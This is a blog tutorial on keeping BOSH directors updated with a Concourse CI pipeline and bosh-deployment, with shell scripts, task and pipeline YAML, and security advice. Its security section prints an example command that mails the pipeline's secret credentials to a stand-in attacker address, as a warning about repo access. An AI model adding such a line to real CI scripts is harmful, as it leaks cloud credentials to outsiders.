  BOSH directors can be deployed (and redeployed) with a properly built
  Concourse pipeline and manifests generated by the curated
  `bosh-deployment` manifest generation tool. This lightens
  the burden of keeping BOSH directors patched & up-to-date.
title: Maintaining BOSH Directors with Concourse CI and bosh-deployment
---

*"BOSH deploys Concourse, and Concourse deploys BOSH" â€”Cloud Foundry koan*

A BOSH Director is a VM (virtual machine) orchestrator which is itself a VM.
BOSH solves the problem of keeping its VMs' applications (operating systems
(stemcells) and releases) up-to-date with the command, `bosh deploy`; however,
this begs the question, "what keeps the BOSH Director itself up-to-date?".
<sup><a href="#quis" class="alert-link">[Quis custodiet?]</a></sup>

We explore using [Concourse](https://concourse.ci/), a Continuous Integration
(CI) server, and
[bosh-deployment](https://github.com/cloudfoundry/bosh-deployment/) <sup><a
href="#bosh_up_to_date" class="alert-link">[Updating BOSH]</a></sup>, in order
to create a [Concourse
pipeline](https://github.com/cloudfoundry/bosh-deployment/) which updates, in
turn, a BOSH director on AWS (Amazon Web Services), on Microsoft Azure, and GCP
(Google Cloud Platform). Updating all three BOSH directors can be accomplished
with a single click. <sup><a href="#one_click" class="alert-link">[One
click]</a></sup> Best of all, our directors are re-deployed with a recent
stemcell, BOSH release, and CPI release.  <sup><a href="#how_recent"
class="alert-link">[How recent?]</a></sup>

## 0. Overview

Our Concourse pipeline is publicly-viewable, and can be seen at
<https://ci.nono.io/teams/main/pipelines/BOSH>. It's a straightforward pipeline
which consists of three jobs, one for each director on each IaaS (Infrastructure
as a Service): bosh-aws.nono.io, bosh-azure.nono.io, and bosh-gce.nono.io.

{{< figure src="https://user-images.githubusercontent.com/1020675/31297994-0405c082-aa9d-11e7-9669-b8f08852d286.png" >}}

Below is a diagram of our Concourse configuration which describes the pipeline
in greater detail. Note that we keep our credentials (e.g our AWS access key and
secret) in LastPass (see items in red), but LastPass is not strictly necessary:
credentials can be embedded directly in the BOSH manifests, can be passed as
variables during the BOSH manifest creation, or can be maintained as files on
the local hard drive.

{{< figure src="https://docs.google.com/drawings/d/e/2PACX-1vTXkKXrmPKiLkU2AwIiDWtA5FDun6u8TvGN49SbZ1jlsRScOyQT_B4sInIryzCveyK3-ia1DjSyvFLT/pub?w=1224&h=1584" >}}

## 1. Concourse Tasks

To build our Concourse pipeline, we begin with the the smallest configurable
component, the Concourse [task](https://concourse.ci/running-tasks.html).

The Concourse task is often a set of Concourse resources (e.g GitHub
repositories containing BOSH manifests), environment variables (e.g. `${IAAS}`
(the IaaS to which we're deploying)), and perhaps most importantly, the shell
script which deploys the director.

### 1.0 Concourse Task Shell Script

Here is our annotated [shell
script](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/ci/tasks/bosh.sh)
our Concourse tasks use to deploy our BOSH director:

_[Note: see next section, [Simplify the Concourse Task](#simpler), for a simpler
task shell script; it's a better starting point. We customize our BOSH directors
in a manner which complicates our task shell script.]_

```bash
#!/bin/bash

# We abort the script as soon as we hit an error (as soon as a command exits
# with a non-zero exit status)
set -e

# `cunnie-deployments` is the checked-out GitHub repo that contains our BOSH
# manifests and our directors' `-state.json` files; it also contains this
# script (task script) and task definition.
pushd cunnie-deployments

# We invoke the script that generates our BOSH director's manifest, e.g.
# `aws.sh`, `azure.sh`. The output, the BOSH director's manifest, is named
# `bosh-$IAAS.yml`, e.g. `bosh-aws.yml`
bin/$IAAS.sh

# Does ${DEPLOYMENTS_YML} have a complete set of interpolated variables?
# Abort if not (`--var-errs`).
bosh int bosh-$IAAS.yml \
  --var-errs \
  -l <(echo "$DEPLOYMENTS_YML") \
  -l <(curl https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml) \
  > /dev/null

# We attempt to deploy our BOSH director. We prepare a git commit message
# regardless whether our attempt succeeds or fails because we need to retain any
# change to the BOSH director's `-state.json` file. This is necessary in cases
# where a deploy proceeds far enough to create a broken director VM, for
# subsequent deploys must be able to destroy the broken director VM in order to
# free up its IP address so that the current deploy will succeed. The crucial
# information needed to destroy the  broken director VM is its VM's ID, which is
# recorded in the `-state.json` file.

# Note that `set -e` does not trigger an abort if the command that returns a
# non-zero exit code is the subject of an `if` block, i.e. `if bosh create-env`;
# this gives us the breathing room to commit our results regardless of whether
# `bosh create-env` succeeded or failed
if bosh create-env bosh-$IAAS.yml \
  -l <(echo "$DEPLOYMENTS_YML") \
  -l <(curl https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml); then
  GIT_COMMIT_MESSAGE="CI PASS: $IAAS BOSH deploy :airplane:"
  DEPLOY_EXIT_STATUS=0
else
  GIT_COMMIT_MESSAGE="CI FAIL: $IAAS BOSH deploy :airplane:"
  DEPLOY_EXIT_STATUS=1
fi

# Do we need to commit anything? If a new director hasn't been deployed (most
# often because there's been no change to the manifest, releases, or stemcell),
# then we don't need to commit
if ! git diff --quiet HEAD --; then
  # If we're in this block, then there has been a deployment. Let's set our
  # git author to avoid git's `*** Please tell me who you are.` error.
  git config --global user.name "Concourse CI"
  git config --global user.email brian.cunnie@gmail.com

  # We check out our branch's HEAD because Concourse's git-resource leaves us
  # in `detached HEAD` state. ${DEPLOYMENTS_BRANCH} is typically set to
  # `master`, but may be set to something else (usually while testing).
  git checkout $DEPLOYMENTS_BRANCH
  git add .
  git commit -m"$GIT_COMMIT_MESSAGE"
fi
popd

# We copy our repo with its new commit to a new directory. The Concourse job,
# after it finishes running this task, will push the new commit to GitHub.
# Note that `cp -R` works as well as `rsync`; we use `rsync` by force of
# habit.
rsync -aH cunnie-deployments/ cunnie-deployments-with-state/

# We exit with the return code of `bosh create-env`; if the deploy failed, then
# this Concourse task failed
exit $DEPLOY_EXIT_STATUS
```

For those interested in the scripts which generate the BOSH director manifests
(e.g. `aws.sh`), they were covered in an earlier [blog
post](http://engineering.pivotal.io/post/bosh-ssl/). For links to the scripts
and the manifests they generate,  see the table below:

| IaaS  | Script | Generated Manifest |
|-------|--------|----------|
| AWS   | [aws.sh](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bin/aws.sh) | [bosh-aws.yml](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bosh-aws.yml) |
| Azure | [azure.sh](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bin/azure.sh) | [bosh-azure.yml](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bosh-azure.yml) |
| GCP   | [gce.sh](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bin/gce.sh) | [bosh-gce.yml](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bosh-gce.yml) |

### <a name="simpler">1.1 Simplify the Concourse Task Script</a>

<div class="alert alert-warning" role="alert">

<b>Simplify the Concourse task script.</b> Specifically, inline the
<code>bosh-${IAAS}.sh</code> script, then collapse the two <code>bosh
interpolate</code> commands into the singular <code>bosh create-env</code>
command.

</div>

<p />

Start with a simple Concourse task script.
Really. Don't use the task script we use,
<sup><a href="#complicated" class="alert-link">[Why so complicated?]</a></sup> ,
the one listed above. Instead, start with a
simplified task script, like
[`bosh-simple.sh`](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/ci/tasks/bosh-simple.sh).
We have tested it; it successfully deploys a director.

### 1.2 Concourse Task Configuration file

Now that we have our task's shell script, we turn our attention to our task's
(YAML) configuration file. It can be viewed on [GitHub](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/ci/tasks/bosh.yml),
and is displayed below, too:

```yaml
---
platform: linux

image_resource:
  type: docker-image
  source:
    repository: cunnie/fedora-golang-bosh

inputs:
- name: cunnie-deployments
- name: bosh-deployment

outputs:
- name: cunnie-deployments-with-state

params:
  # vainly default branch to master, but it's always overridden from the pipeline
  DEPLOYMENTS_BRANCH: 'master'
  DEPLOYMENTS_YML: ''
  IAAS: ''

run:
  path: cunnie-deployments/ci/tasks/bosh.sh
```

Notes:

`image_resource:` We use a custom-built Docker image,
`cunnie/fedora-golang-bosh`
(<https://hub.docker.com/r/cunnie/fedora-golang-bosh/~/dockerfile/>); but you
may choose to  use your own Docker image; just be sure that the [BOSH
CLI](https://github.com/cloudfoundry/bosh-cli) is installed. Our image is fairly
hefty (450 MB), for it has a rich set of tools available to us when we need to
[intercept](https://concourse.ci/fly-intercept.html) the container to
troubleshoot a build.

`inputs:` We have two inputs:
[`bosh-deployment`](https://github.com/cloudfoundry/bosh-deployment), a git repo
which contains the manifests and tools necessary to deploy a BOSH director (this
is the canonical way to deploy a BOSH director), and
[`cunnie-deployments`](https://github.com/cunnie/deployments/), a git repo which
contains our BOSH directors' manifests and state files. Also, this repo contains
the required Concourse task definition (`ci/tasks/bosh.yml`) and script
(`ci/tasks/bosh.sh`).

`outputs:` We have one output, `cunnie-deployments-with-state`, which is the
same as the input, `cunnie-deployments`. Concourse prohibits an input from also
being an output, so our script copies the contents of one to the other.
`cunnie-deployments-with-state` includes the commits made by the task (in the
case of a deploy, the state file and possibly the BOSH director's manifest).
This output is used by a subsequent step in the Concourse job which will push
any git commits to GitHub (although this Concourse _task_ may make git commits,
it won't push them â€” it leaves that responsibility to the Concourse _job_).

`params:` `DEPLOYMENTS_BRANCH` is almost always set to `master`; it refers to
the branch in the `cunnie-deployments` repo. `IAAS` is either `aws`, `azure`, or
`gce`. `DEPLOYMENTS_YML` is YAML-formatted and contains secrets needed to
deploy; sample contents can be viewed in an earlier [blog
post](http://engineering.pivotal.io/post/bosh-ssl/#secrets_file).

_[Note: you may opt to bypass the task configuration file completely and embed
the necessary information into `pipeline.yml`;
[here](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/ci/pipeline.yml#L54-L79)
is an example of embedding the task configuration directly into the pipeline.]_

## 2. Concourse Jobs

The Concourse job is straightforward:

- It checks out the `cunnie-deployments` and `bosh-deployment` git repos
- It runs the task which deploys the BOSH director to the specified IaaS
- It pushes changes to the director manifest (`bosh-${IAAS}.yml`) and the
  director state (`bosh-${IAAS}-state.json`) to the `cunnie-deployments` repo
  regardless of whether the deploy succeeded or failed (i.e. the `ensure`
  directive)

Here is the Concourse job definition which deploys the BOSH director to the AWS
IaaS:

```yaml
jobs:
- name: bosh-aws.nono.io
  plan:
  - get: cunnie-deployments
  - get: bosh-deployment
  - task: deploy
    file: cunnie-deployments/ci/tasks/bosh.yml
    params:
      DEPLOYMENTS_BRANCH: master
      DEPLOYMENTS_YML: ((deployments_yml))
      IAAS: aws
    ensure:
      put: cunnie-deployments
      params:
        repository: cunnie-deployments-with-state/
```

## 3. Concourse Pipeline

The full Concourse pipeline (`pipeline.yml`) can be seen
[here](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/ci/pipeline.yml).
Below is an abbreviated portion which shows the Concourse resources and the first
job (which deploys the AWS BOSH director):

```yaml
# fly -t nono sp -p BOSH -c ~/workspace/deployments/ci/pipeline.yml -v github_deployments_key="$(lpass show --note github_deployments_key)" -v deployments_yml="$(lpass show --note deployments.yml)"

jobs:
- name: bosh-aws.nono.io
  plan:
  - get: cunnie-deployments
  - get: bosh-deployment
  - task: deploy
    file: cunnie-deployments/ci/tasks/bosh.yml
    params:
      DEPLOYMENTS_BRANCH: master
      DEPLOYMENTS_YML: ((deployments_yml))
      IAAS: aws
    ensure:
      put: cunnie-deployments
      params:
        repository: cunnie-deployments-with-state/
# Other jobs redacted for brevity
resources:
- name: cunnie-deployments
  type: git
  source:
    uri: git@github.com:cunnie/deployments.git
    private_key: ((github_deployments_key))
    branch: master
- name: bosh-deployment
  type: git
  source:
    uri: https://github.com/cloudfoundry/bosh-deployment.git
```

Notes:

The first line is a convenience comment; it shows the `fly` (Concourse CLI)
command which updates the Concourse server's pipeline after changes have been
made to the `pipeline.yml` file. We cut-and-paste that comment into our shell
whenever we make a change to `pipeline.yml` in order to propagate the changes to
the pipeline to our Concourse server:

```bash
fly -t nono sp -p BOSH -c ~/workspace/deployments/ci/pipeline.yml -v github_deployments_key="$(lpass show --note github_deployments_key)" -v deployments_yml="$(lpass show --note deployments.yml)"
```

We have already discussed `deployments_yml` (i.e. the Concourse task environment
variable/parameter `DEPLOYMENTS_YML`), but the other variable,
`github_deployments_key`, warrants discussion. It is a [GitHub deploy
key](https://developer.github.com/v3/guides/managing-deploy-keys/) which allows
our job to push changes to the `cunnie-deployments` repo
<sup><a href="#interpolation" class="alert-link">[Interpolation]</a></sup> .

We'd like to discuss how we stop the pipeline when the deploy of a BOSH director
fails. We use Concourse's [`passed`](https://concourse.ci/build-plans.html)
directive. For example, if our deploy of the AWS director fails, we do _not_
want to deploy the Azure director.

The following shows the `diff` between the job to deploy the AWS director and
the job to deploy Azure director. Pay special attention to the `passed` and
`trigger` directives: the deploy of the Azure director is kicked off if and only
if there has been a successful deploy of the AWS director. This limits the
damage caused by a flawed configuration: only one director is knocked offline
(typically the first one, AWS), not all three.

```diff
-- name: bosh-aws.nono.io
+- name: bosh-azure.nono.io
   plan:
   - get: cunnie-deployments
+    passed: [ bosh-aws.nono.io ]
+    trigger: true
   - get: bosh-deployment
+    passed: [ bosh-aws.nono.io ]
+    trigger: true
   - task: deploy
     file: cunnie-deployments/ci/tasks/bosh.yml
     params:
       DEPLOYMENTS_BRANCH: master
       DEPLOYMENTS_YML: ((deployments_yml))
-      IAAS: aws
+      IAAS: azure
     ensure:
       put: cunnie-deployments
       params:
```

## 4. Security

<div class="alert alert-error" role="alert">

Restrict your Concourse teams to people you trust, don't unnecessarily expose
your pipelines or publish your pipelines' configurations (`.yml` files).
Similarly, restrict access to your GitHub repo which has your director manifests
and Concourse scripts.

</div>

<p />

Our credentials are stored in our Concourse pipeline, and they can be easily
revealed by a trusted user with the following command:

```bash
fly -t nono get-pipeline -p BOSH
```

These credentials include IaaS credentials, which will allow a bad actor to spin
up multiple VMs to run, say, Bitcoin mining. A co-worker of the author whose
credentials were compromised had unauthorized AWS charges exceeding $3k.

It is also important to restrict access to the GitHub repo which contains the
scripts that are run. Although the repo does not contain credentials, it enables
the execution of commands which can reveal the credentials. For example, the
following line of code could be added to the `ci/tasks/bosh.sh` script to email
the credentials to the bad actor:

```bash
echo ${DEPLOYMENTS_YML} | mail -s "secret credentials" bad.actor@mailinator.com
```

## Footnotes

<a name="quis"><sup>[Quis custodiet?]</sup></a> "Who updates the VM [BOSH
director] that keeps the other VMs updated?" is the question, versions of which
have been asked as long ago as the days of the Roman poet Juvenal, who famously
asked, "[Quis custodiet ipsos
custodes?](https://en.wikipedia.org/wiki/Quis_custodiet_ipsos_custodes%3F)" and
as recently as this century by comic book writer Alan Moore, who phrased it,
"Who watches the Watchmen?"

<a name="how_recent"><sup>[How recent?]</sup></a>
How fresh is `bosh-deployment`? Fresh.  `bosh-deployment` is a quite
active git repo, typically updated [several times or more each
week](https://github.com/cloudfoundry/bosh-deployment/graphs/commit-activity).
It's the tool that the BOSH team, and many Cloud Foundry teams, use to keep
their BOSH directors current.

<a name="bosh_up_to_date"><sup>[Updating BOSH]</sup></a> In the early days, the
BOSH micro plugin was the mechanism to update the BOSH director. There were
several drawbacks to the micro plugin, one of which is that it forced the BOSH
CLI to have an understanding of the API for various IaaSes, breaking the Cloud
Layer abstraction model.

Another drawback of the BOSH micro plugin was that it was brittle, so much so
that it was a common pattern to deploy a BOSH director whose sole purpose was to
deploy the "real" BOSH director. "Ha!" one might ask, "But how did you keep that
first BOSH director up-to-date?" The answer is simple: you didn't. You left that
first BOSH director running and never touched it except to redeploy the "real"
BOSH director. You might spin it down if you weren't using it, but you never
deleted it or updated it.

These were serious problems, and to address them the BOSH Core team wrote
[`bosh-init`](https://github.com/cloudfoundry/docs-bosh/commit/a159cc4f6633ca26d7c9ce1d4ace961b0d1bad20),
a Golang-based executable whose purpose was to deploy BOSH directors. It adhered
to the Cloud Layer abstraction models (it used the existing CPIs (Cloud Provider
Interfaces) for the existing IaaSes ([VMware
vSphere](https://github.com/cloudfoundry-incubator/bosh-vsphere-cpi-release),
[Google Cloud
Platform](https://github.com/cloudfoundry-incubator/bosh-google-cpi-release)
(GCP),
[OpenStack](https://github.com/cloudfoundry-incubator/bosh-openstack-cpi-release),
[Microsoft
Azure](https://github.com/cloudfoundry-incubator/bosh-azure-cpi-release), among
others)).

By April 30, 2015, `bosh-init` was production-ready, and the BOSH documentation
was [updated](https://github.com/cloudfoundry/docs-bosh/commit/a159cc4f6633ca26d7c9ce1d4ace961b0d1bad20)
to reflect the new world order.

But all was not perfect in the Garden of Eden, for the introduction of
`bosh-init` split the CLIs: whereas before there was one BOSH CLI, now there
were two: `bosh`, the original Ruby-based CLI for managing a BOSH director's
deployment, and `bosh-init` for deploying a BOSH director itself. In many ways
this resembled the [Western
Schism](https://en.wikipedia.org/wiki/Western_Schism), a dark chapter in the
Roman Catholic church when there were two popes (who had the terrible habit of
excommunicating each other). The BOSH development team remedied this situation
by creating a _third_ CLI, the [Golang-based
CLI](https://bosh.io/docs/cli-v2.html). In this regard, the BOSH development
team's approach mirrored the approach attempted by the Catholic cardinals,
who elected a _third_ pope. The BOSH team's approach succeeded, but the
cardinals' didn't (they were left with three popes running around
excommunicating each other).

<a name="one_click"><sup>[One click]</sup></a> It's technically possible
to kick off the builds with _zero_ clicks â€” to kick off the build automatically
if, say, a commit is pushed to the _bosh-deployment_ repository. The modification
to the pipeline is trivial:

```diff
 - name: bosh-aws.nono.io
   plan:
   - get: cunnie-deployments
   - get: bosh-deployment
+    trigger: true
 - task: deploy
```

However, the decision to trigger automatically is not without risks: the BOSH
director may be in the middle of a delicate task, such as updating a deployment,
and won't have the opportunity to gracefully bring itself down, for`bosh
create-env` is relentless, brooks no delays, and gives no quarter.

On a more technical note, `bosh create-env`, although it will attempt to contact
the [BOSH agent](https://github.com/cloudfoundry/bosh-agent) on the original
BOSH director in order to terminate the jobs and shut down the VM, it does not
run the [drain scripts](https://bosh.io/docs/drain.html) (scripts which allow
the BOSH jobs to clean up and get into a state where they can be safely
stopped).

There is discussion within the BOSH development team whether to modify the
behavior of `bosh create-env` to make it run the drain scripts. On the positive
side, it will allow a more cavalier approach to re-deploying the director, and
make the behavior of `bosh create-env` more closely approximate the behavior of
a BOSH director. On the downside, the time to deploy a BOSH director may vary
widely, dependent on the time it takes for the drain scripts to complete.

<a name="interpolation"><sup>[Interpolation]</sup></a>
Our GitHub deploy key resembles the following (not our real key) <sup><a
href="#ECC" class="alert-link">[Elliptic-curve]</a></sup> :

```
-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIMxcR2wlxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxqY/VyDTL
AwEHoUQDQgAEmBUxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxjY98wOPVZ
Ayz++1vHXODWeiC/CjNu7hOVaB682ZZfCw==
-----END EC PRIVATE KEY-----
```

Concourse, when passed the flag `... -v github_deployments_key="$(lpass show
--note github_deployments_key)"` will interpolate this section of
`pipeline.yml`:

```yaml
type: git
source:
  uri: git@github.com:cunnie/deployments.git
  private_key: ((github_deployments_key))
```

After interpolation, the pipeline looks like this:

```yaml
- name: cunnie-deployments
  type: git
  source:
    uri: git@github.com:cunnie/deployments.git
    # previously: private_key: ((github_deployments_key))
    private_key: |
      -----BEGIN EC PRIVATE KEY-----
      MHcCAQEEIMxcR2wlxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxqY/VyDTL
      AwEHoUQDQgAEmBUxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxjY98wOPVZ
      Ayz++1vHXODWeiC/CjNu7hOVaB682ZZfCw==
      -----END EC PRIVATE KEY-----
```

If your pipeline is not public, it may be easier to _skip variable interpolation
and embed the credential(s) directly_.

<a name="complicated"><sup>[Why so complicated?]</sup></a>
Our Concourse task is complicated (i.e. `bosh.sh` calls `bosh-${IAAS}.sh`, calls
`bosh` CLI three times) because we have requirements beyond merely deploying a
BOSH director:

* We retain intermediate BOSH manifests (e.g.
  [`bosh-aws.yml`](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bosh-aws.yml),
  manifests that are completely populated with the exception of the secrets
  (passwords, credentials, private keys). The sole purpose of the first `bosh
  interpolate` commands is to generate the intermediate manifest.<br/><br/> We
  realize that our love of the intermediate manifests is not wholly rational:
  time was when a working BOSH manifest was a precious thing, something to tend
  to and to preserve. With the advent of `bosh-deployment`, which reliably
  generates BOSH manifests, the intermediate manifests have diminished in
  importance, and are now merely artifacts of a bygone age. And yet we still
  cling to them, for they provide a sense of comfort, like a mother's hot apple
  pie.

* We prefer to set our own passwords rather than use the ones auto-generated
  <sup><a href="#entropy" class="alert-link">[auto-passwords]</a></sup> by the
  BOSH CLI. This has two implications:

  * It forces us to set the password variables in a counter-intuitive manner (e.g.
    `bosh interpolate ... -v admin_password='((admin_password))' ...`) (which
    says, in effect, "replace all occurrences of '((admin_password))' with
    '((admin_password))'."), which prevents the BOSH CLI from using its
    auto-generated passwords and paves the way to subsequently interpolate our
    passwords. This adds [several
    lines](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bin/aws.sh#L42-L49)
    to our scripts.

  * It forces us to check to make sure that we haven't overlooked any variables
    (i.e. we run `bosh interpolate --var-errs ...`), so that, for example, our
    director's password is set to `IReturnedAndSawUnderTheSun` and not
    `((admin_password))`).  This adds [several more
    lines](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/ci/tasks/bosh.sh#L17-L23)
    to our scripts.

* Our BOSH director uses certificates issued by a recognized CA ([Certificate
  Authority](https://en.wikipedia.org/wiki/Certificate_authority)) (in our case,
  [Comodo](https://en.wikipedia.org/wiki/Comodo_Group)). This requires us to
  create a manifest operations file (e.g.
  [`etc/aws.yml`](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/etc/aws.yml#L29-L41))
  which we [pass to `bosh
  interpolate`](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bin/aws.sh#L24)
  which overrides the auto-generated SSL certificate & key with our certificate &
  key.

* Some of our BOSH directors (e.g. bosh-aws.nono.io) are more than mere BOSH
  directors â€” they are also nginx servers (web servers), DNS (Domain Name
  System) servers, and NTP (Network Time Protocol) servers. This adds
  [three more
  lines](https://github.com/cunnie/deployments/blob/a8afca8f2aa8994b60d73a2cc1f48f1357a65cb5/bin/aws.sh#L25-L27)
  to our scripts.

Note: one advantage of using CA-issued certificates and easy-to-remember
passwords is that it enables one to reach the BOSH director via the CLI without
needing the `creds.yml` file â€” one can sit at a new workstation, type `bosh -e
bosh-gce.nono.io login`, and proceed to manage deployments, releases, stemcells,
etc....

<a name="entropy"><sup>[auto-passwords]</sup></a> The BOSH CLI generates
[high-entropy](https://en.wikipedia.org/wiki/Password_strength#Entropy_as_a_measure_of_password_strength)
passwords when `--vars-store` flag is passed.

Here is a list of sample passwords that `bosh create-env --vars-store=...` creates:

```
admin_password: qn7hc6zsq0nphhsvojx3
blobstore_agent_password: iut5wdyeo5kkhvqoerj0
blobstore_director_password: wm0qgnzdwgy8k1hnm4nq
hm_password: plk829eob45khq6o9dl5
mbus_bootstrap_password: nf16h5e9j120uqp35hlr
nats_password: gr4s0xmj4s5iccqv69dt
postgres_password: 7nxuq714hxcta513778g
registry_password: ffxnhu4xtgh7lsxu7xpl
```

Note that the passwords are 20 bytes long and consist of random sequence of
numbers and lowercase letters. Each byte can be one of 36 possibilites (10
numbers plus 26 letters). Given that there are 20 bytes, the total number of
combinations is 36<sup>20</sup>, 1.33 x 10<sup>31</sup>, effectively rendering
the password immune to a brute-force attack (even if you could make a million
attempts every second, it would still require 4 &times; 10<sup>17</sup> years to
exhaust all combinations. In other words, you'd crack the password long after
the [Stelliferous
Era](https://en.wikipedia.org/wiki/The_Five_Ages_of_the_Universe#Stelliferous_Era)
ended and you were well into the [Degenerate
Era](https://en.wikipedia.org/wiki/The_Five_Ages_of_the_Universe#Degenerate_Era)).


<a name="ECC"><sup>[Elliptic-curve]</sup></a>We use [elliptic-curve
cryptography](https://en.wikipedia.org/wiki/Elliptic-curve_cryptography) (ECC)
keys, for they are much shorter than an RSA key of [equivalent
strength](https://www.globalsign.com/en/blog/elliptic-curve-cryptography/), and
thus more manageable. Unfortunately, they are not universally accepted (e.g. AWS
will respond with "Error importing Key Pair Key is not in valid OpenSSH public
key format" when importing an EC public key).

Where elliptic-curve cryptography is concerned, GitHub is ahead of the
proverbial curve, and AWS, behind.

## Corrections & Updates

*2017-12-01*

We suggest simplifying the Concourse task script. The Concourse task script
executes the BOSH CLI three times (`bosh int` twice and `bosh create-env` once),
but need only execute it once (`bosh create-env`) when intermediate artifacts
aren't desired.

David McClure pointed out that the OpenStack link was missing; it has been
added. Thanks, David.
